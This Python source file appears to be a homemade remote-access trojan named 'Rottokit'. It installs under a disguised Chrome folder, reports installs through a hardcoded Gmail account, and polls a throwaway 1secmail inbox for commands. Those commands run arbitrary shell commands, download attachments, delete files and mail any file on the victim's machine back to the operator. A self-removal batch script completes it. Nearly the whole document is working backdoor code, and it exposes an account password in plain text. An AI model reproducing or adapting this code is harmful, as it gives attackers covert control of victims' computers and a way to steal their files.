import os

os.chdir(os.path.abspath( os.path.dirname( __file__ ) ))


#with open(r'C:\Cartella\roba di ema\scuola\programmazione\Linguaggi\Python\Script\Rottokit\pathhh.txt','w') as f:
#    f.write(os.getcwd())
#print('written')

from shutil import rmtree
from time import sleep
from subprocess import call
from mailer import Mailer
#from pathlib import Path
#from mailer import Mailer
from datetime import datetime, timedelta
from urllib.request import urlopen
from threading import Timer
#import urllib3
#from time import sleep



#--------------------------------------------tempmail.py-----------------------------------------


import requests as requests
from random import choice
from string import ascii_lowercase, digits
#import time
#import sys
from re import search

API = 'https://www.1secmail.com/api/v1/'
domainList = ['1secmail.com', '1secmail.net', '1secmail.org']
#domainList = ['gmail.com']
globals()['domain'] = choice(domainList)

def get_domain_list():
    return domainList

def banner():
    print(r'''
                         ''~``
                        ( o o )
+------------------.oooO--(_)--Oooo.------------------+
|                                                     |
|                    Mail Swipe                       |
|               [by Sameera Madushan]                 |
|                                                     |
|                    .oooO                            |
|                    (   )   Oooo.                    |
+---------------------\ (----(   )--------------------+
                       \_)    ) /
                             (_/
    ''')

def generateUserName():
    name = ascii_lowercase + digits
    username = ''.join(choice(name) for i in range(10))
    return username

def extract():
    getUserName = search(r'login=(.*)&',newMail).group(1)
    getDomain = search(r'domain=(.*)', newMail).group(1)
    return [getUserName, getDomain]

"""
# Got this from https://stackoverflow.com/a/43952192/13276219
def print_statusline(msg: str):
    last_msg_length = len(print_statusline.last_msg) if hasattr(print_statusline, 'last_msg') else 0
    print(' ' * last_msg_length, end='\r')
    print(msg, end='\r')
    sys.stdout.flush()
    print_statusline.last_msg = msg
"""

def deleteMail():
    url = 'https://www.1secmail.com/mailbox'
    data = {
        'action': 'deleteMailbox',
        'login': f'{extract()[0]}',
        'domain': f'{extract()[1]}'
    }

    #print_statusline("Disposing your email address - " + mail + '\n')
    req = requests.post(url, data=data)

def checkMails():
    reqLink = f'{API}?action=getMessages&login={extract()[0]}&domain={extract()[1]}'
    req = requests.get(reqLink).json()
    length = len(req)
    if length == 0:
        pass
        #print_statusline("Your mailbox is empty. Hold tight. Mailbox is refreshed automatically every 5 seconds.")
    else:
        idList = []
        for i in req:
            for k,v in i.items():
                if k == 'id':
                    mailId = v
                    idList.append(mailId)

        x = 'mails' if length > 1 else 'mail'
        #print_statusline(f"You received {length} {x}. (Mailbox is refreshed automatically every 5 seconds.)")

        #current_directory = os.getcwd()
        #final_directory = os.path.join(current_directory, r'All Mails')
        #if not os.path.exists(final_directory):
        #    os.makedirs(final_directory)

        #print(idList)
        globals()['idd'] = idList
        for i in idList:
            msgRead = f'{API}?action=readMessage&login={extract()[0]}&domain={extract()[1]}&id={i}'
            #print(msgRead)
            req = requests.get(msgRead).json()
            for k,v in req.items():
                if k == 'from':
                    sender = v
                if k == 'subject':
                    subject = v
                if k == 'date':
                    date = v
                if k == 'textBody':
                    content = v

            #mail_file_path = os.path.join(final_directory, f'{i}.txt')
            #print('i'+str(i))
            dict_mail = {"Sender":sender,"To":mail,"Subject":subject,"Date":date,"Content":content}
            #print(dict_mail)        
            return dict_mail
        
            #with open(mail_file_path,'w') as file:
             #   file.write("Sender: " + sender + '\n' + "To: " + mail + '\n' + "Subject: " + subject + '\n' + "Date: " + date + '\n' + "Content: " + content + '\n')

"""
def create_mail():
    globals()['newMail'] = f"{API}?login={generateUserName()}&domain={domain}"
    reqMail = requests.get(newMail)
    globals()['mail'] = f"{extract()[0]}@{extract()[1]}"
    return mail

def create_mail(domani_name):
    globals()['newMail'] = f"{API}?login={domani_name}&domain={domain}"
    reqMail = requests.get(newMail)
    globals()['mail'] = f"{extract()[0]}@{extract()[1]}"
    return mail
"""

def create_mail(domain_name=None,domainn=None):
    if domain_name==None and domainn==None:
        globals()['newMail'] = f"{API}?login={generateUserName()}&domain={domain}"
    elif domainn==None:
        globals()['newMail'] = f"{API}?login={domain_name}&domain={domain}"
    elif domain_name==None:
        globals()['newMail'] = f"{API}?login={generateUserName}&domain={domainn}"
    else:
        globals()['newMail'] = f"{API}?login={domain_name}&domain={domainn}"
    reqMail = requests.get(newMail)
    globals()['mail'] = f"{extract()[0]}@{extract()[1]}"
    return mail

    #pyperclip.copy(mail)
    #print("\nYour temporary email is " + mail + " (Email address copied to clipboard.)" + "\n")
    #print(f"---------------------------- | Inbox of {mail} | ----------------------------\n")


def check_mail():
    dict_mail = None
    while dict_mail == None:
        dict_mail = checkMails()
    return dict_mail

def downloadFile(attachName,fileFullPath):
    try:
        msgDownload = f'{API}?action=download&login={extract()[0]}&domain={extract()[1]}&id={idd[0]}&file={attachName}'
        req = requests.get(msgDownload, allow_redirects=True)
        open(fileFullPath, 'wb').write(req.content)
        return 1
    except:
        return 0
        
#-----------------------------END of tempmail.py--------------------------------------


name_file = r'urst\nio.l'

def get_name():
    with open(name_file, "r") as f:
        script_name = f.read().strip().strip('/n').strip()
    return script_name

def raw(string):
    str = repr(string)
    return str[1:len(str)-1]

def get_path(string):
    filepath = string.strip().strip('"').strip().strip().strip('\n').strip()
    return filepath

#global mail
receiver = 'rottokit.receiver@gmail.com'
script_name = get_name()
WinDir = os.getenv('LOCALAPPDATA') + r'\Google\Chrome\User Data\Default\CertificateRevocation\6399'
python = WinDir + r'\ChromeUpdates'
installer = WinDir + r'\installer.exe'
if os.path.exists(installer):
    os.remove(installer)

lastmail_file = r'urst\lm.l'
if not os.path.exists(lastmail_file):
    maill = Mailer(email='rottokit@gmail.com', password='thisisnotavirus')
    maill.send(receiver=receiver, subject=f'{script_name} installed!', message=f'{script_name} has been correctly installed!')
    with open(lastmail_file, "w") as f:
        f.write(str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        
#print(python)

#""""
def repeat_loop(fun,parameters = [], milliseconds=0, seconds=0, minutes=0, hours=0, days=0, weeks=0):
    def start():
        timer(set_time())
        
    def set_time():
        time_change = timedelta(milliseconds=milliseconds,
                                         seconds=seconds, 
                                         minutes=minutes, 
                                         hours=hours, 
                                         days=days, 
                                         weeks=weeks)
        new_time = datetime.now() + time_change
        actual_time = datetime.today()
        delta_t= new_time -actual_time

        secs=delta_t.seconds+1
        return secs

    def timer(secs):
        t = Timer(secs, function)
        t.start()

    def function():
        try:
            parameters[0]
            globals()[fun](parameters)
        except:
            try:
                globals()[fun]()
            except:
                passs = 0
                while not passs:
                    print('waiting for intenert...')
                    passs = check_internet_conn()
                    sleep(3)
        timer(set_time())
        
    function()
#"""

def check_internet_conn():
    try:
        #urllib.request.urlopen('http://google.com') #Python 3.x
        urlopen('http://google.com') #Python 3.x
        return 1
    except:
        return 0

def operations(string):
    maill = Mailer(email='rottokit@gmail.com', password='thisisnotavirus')
    status = 0
    print(string)
    try:
        args = string.split('!')
        operation = args[0].strip().strip('\n').strip()
        #print(operation)
        if (operation == 'create'):
            #print('inside')
            filepath = get_path(args[1])
            try:
                content = args[2].strip().strip('\n').strip()
            except:
                content = 'dir'
            #print(filepath,content)
            status = create(filepath,content)
            if status:
                maill.send(receiver=receiver, subject=f'{script_name} create success', message=f'{script_name} has correctly created {filepath}')
        elif (operation == 'delete'):
            path = get_path(args[1])
            status = delete(path)
            if status:
                maill.send(receiver=receiver, subject=f'{script_name} delete success', message=f'{script_name} has correctly deleted {path}')
        elif (operation == 'run'):
            program = get_path(args[1])
            try:
                path = get_path(args[2])
                status = run(program, path = path)
                if status:
                    maill.send(receiver=receiver, subject=f'{script_name} run success', message=f'{script_name} has correctly runned {path} with {program}')
            except:
                status = run(program)
                if status:
                    maill.send(receiver=receiver, subject=f'{script_name} run success', message=f'{script_name} has correctly runned {program}')
                
        elif (operation == 'excec'):
            argument = args[1].strip().strip('\n').strip()
            status = excec(argument)
            if status:
                maill.send(receiver=receiver, subject=f'{script_name} excec success', message=f'{script_name} has correctly excecuted {argument}')
        elif (operation == 'terminate_script'):
            #print('terminate_script')
            maill.send(receiver=receiver, subject=f'{script_name} Terminating all', message=f'{script_name} is permanently deleting all files')
            #dir_path = os.path.dirname(os.path.realpath(__file__))
            content = r"""@echo off
timeout /t 1
set WinDir="%localappdata%\Google\Chrome\User Data\Default\CertificateRevocation\6399"
rmdir /S /Q %WinDir%
del /f "%~dp0%~nx0"
"""
            remover = os.getenv('LOCALAPPDATA') + r'\Google\Chrome\User Data\Default\CertificateRevocation\remover.bat'
            open(remover,'w').write(content)
            os.startfile(remover)
            os._exit(0)
            status = 1
        elif (operation == 'ping'):
            maill.send(receiver=receiver, subject=f'{script_name} Pong', message=f'{script_name} response to ping request')
        elif (operation == 'readfile'):
            filepath = os.path.basename(get_path(args[1]))
            maill.send(receiver=receiver, subject=f'{script_name} Readfile {filepath}', message=f'Here the file', file=get_path(args[1]))
        elif (operation == 'file'):
            attachName = args[1]
            filepath = get_path(args[2])
            status = downloadFile(attachName,filepath)
            if status:
                if os.path.exists(filepath):
                    maill.send(receiver=receiver, subject=f'{script_name} File Install {filepath}', message=f'File {filepath} correctly installed')
                else:
                    maill.send(receiver=receiver, subject=f'{script_name} Check File {filepath}', message=f'Sorry, file {filepath} not installed')
        elif (operation == 'checkfile'):
            filepath = get_path(args[1])
            if os.path.exists(filepath):
                maill.send(receiver=receiver, subject=f'{script_name} Check File {filepath}', message=f'File {filepath} exists')
            else:
                maill.send(receiver=receiver, subject=f'{script_name} Check File {filepath}', message=f'File {filepath} not exists')
        elif (operation == 'stop'):
            maill.send(receiver=receiver, subject=f'{script_name} Stopped', message=f'{script_name} was stopped')
            maildate = datetime.strptime(check_mail()['Date'],"%Y-%m-%d %H:%M:%S")
            with open(lastmail_file, "w") as f:
                f.write(str(maildate))
            os._exit(0)
    except Exception as e:
        print('excpetio')
        print(e)
        maill.send(receiver=receiver, subject=f'{script_name} Error', message=f"There was an error in 'operation' function\n Error: {e}")
    return status


def excec(argument):
    os.system(argument)
    return 1

def run(program, path = None):
    if path:
        call([program, path])
    else:
        call([program])
    return 1

def delete(path):
    if os.path.isfile(path):
        os.remove(path)
        return 1
    elif os.path.isdir(path):
        rmtree(path)
        return 1
    return 0

def create(path,content):
    if content == 'dir':
        if not os.path.exists(path):
            os.mkdir(path)
            return 1
    else:
        print(f'path:{path}')
        with open(path, 'w') as f:
            #print('in')    
            f.write(content)
        #print('done')
        return 1
    return 0

#string = raw('create! C:\Cartella\roba di ema\scuola\programmazione\Linguaggi\Python\Script\Virus\ciao.txt! ciauz')
#string = raw('run! "C:\WINDOWS\system32\notepad.exe"!"C:\Cartella\roba di ema\scuola\programmazione\Linguaggi\Python\Script\Virus\ciao.txt"')
#string = raw('delete! C:\Cartella\roba di ema\scuola\programmazione\Linguaggi\Python\Script\Virus\cia.txt')
#string = raw('run! "C:\WINDOWS\system32\notepad.exe"')
#string = raw('excec! echo helloo > hello.txt')
#string = raw('delete! C:\Cartella\roba di ema\scuola\programmazione\Linguaggi\Python\Script\Virus\ciao.txt')
#string = raw('terminate_script')
#string = raw('create! C:\Cartella\roba di ema\scuola\programmazione\Linguaggi\Python\Script\Virus\dir')
#string = raw('readfile! C:\Cartella\roba di ema\scuola\programmazione\Linguaggi\Python\Script\Virus\sendmail.py')
#print(operations(string))
#print(string)

def always_check_mail():
    print('check')
    email = check_mail()
    try:
        with open(lastmail_file, "r") as f:
            lastmail = datetime.strptime(f.read().strip().strip('/n').strip(),"%Y-%m-%d %H:%M:%S")
    except:
        with open(lastmail_file, "w") as w:
            w.write('2022-04-15 15:00:54')
            lastmail = datetime.strptime('2022-04-15 15:00:54',"%Y-%m-%d %H:%M:%S")
    maildate = datetime.strptime(email['Date'],"%Y-%m-%d %H:%M:%S")
    if maildate > lastmail:
        status = operations(raw(email['Content']))
        with open(lastmail_file, "w") as f:
            f.write(str(maildate))
        print('status ', status)
    

#print(open(WinDir + r'\diagnostics\urst\lm.l','r').read())
connection = 1
passs = 0
while not passs:
    try:
        print(create_mail(domain_name=script_name,domainn='1secmail.net'))
        passs = 1
    except requests.exceptions.ConnectionError:
        print('no internet, passs:',passs)
        passs = check_internet_conn()
        sleep(3)



#print(operations(raw(check_mail()['Subject'])))
#downloadFile('a.txt','bella.txt')

passs = 0
while not passs:
    try:
        repeat_loop('always_check_mail',seconds=5)
        passs = 1
    except Exception as e:
        print(f'____________________________________________________{e}____________________________________________________')
        maill = Mailer(email='rottokit@gmail.com', password='thisisnotavirus')
        maill.send(receiver=receiver, subject=f'{script_name} Generic Error', message=f"There was an error while looping always_check_mail\nError: {e}")

#input()



